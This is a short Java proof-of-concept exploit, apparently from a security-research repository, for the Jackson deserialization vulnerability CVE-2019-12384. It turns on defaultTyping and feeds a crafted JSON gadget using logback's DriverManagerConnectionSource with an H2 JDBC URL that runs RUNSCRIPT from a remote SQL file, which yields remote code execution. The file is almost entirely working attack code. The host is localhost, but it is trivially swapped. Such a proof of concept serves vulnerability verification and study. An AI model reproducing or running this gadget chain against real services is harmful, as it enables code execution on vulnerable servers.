/*
 * [业务问题]: Jackson CVE-2019-12384 RCE 漏洞利用 (H2 链)。
 * [实现逻辑]: 在启用 defaultTyping 的情况下，利用 DriverManagerConnectionSource 类触发 H2 数据库的 RUNSCRIPT，通过加载远程 SQL 文件实现 RCE。
 */
package com.security.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

/**
 * CVE-2019-12384 Jackson RCE 验证。
 */
public class H2Rce {
  public static void main(String[] args) throws IOException {

    ObjectMapper objectMapper = new ObjectMapper();
    objectMapper.enableDefaultTyping();// 开启 defaultTyping
    // TODO 把resources文件inject.sql放到http服务器
    String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
        "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:80/inject.sql'\"}]";
    Object o = objectMapper.readValue(json, Object.class);// 反序列化对象
    String s = objectMapper.writeValueAsString(o);//
  }
}
